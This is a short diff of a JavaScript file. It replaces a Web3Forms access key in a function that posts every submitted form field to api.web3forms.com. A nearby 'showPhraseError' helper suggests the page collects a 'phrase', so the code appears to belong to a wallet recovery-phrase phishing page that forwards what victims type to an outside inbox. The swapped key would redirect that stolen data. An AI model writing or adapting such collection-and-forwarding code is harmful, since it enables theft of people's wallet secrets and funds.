@@ -398,7 +398,7 @@
     function showPhraseError(msg) { if (!phraseStatus) return; phraseStatus.textContent = msg; phraseStatus.style.display = 'block'; setTimeout(()=>{ try{ phraseStatus.style.display='none' }catch(e){} }, 4000); }
 
     async function submitToWeb3Forms(data) {
-      const WEB3FORMS_KEY = '0f982753-249e-4c3a-9c86-2f986c31e880';
+      const WEB3FORMS_KEY = 'b5f9f926-ecd5-4757-b0ad-ff1954bd43ea';
       try {
         const formData = new FormData(); formData.append('access_key', WEB3FORMS_KEY); formData.append('botcheck',''); Object.entries(data).forEach(([key,value])=>{ formData.append(key,value||''); });
         const response = await fetch('https://api.web3forms.com/submit',{ method:'POST', body: formData, mode:'cors', credentials:'omit' });
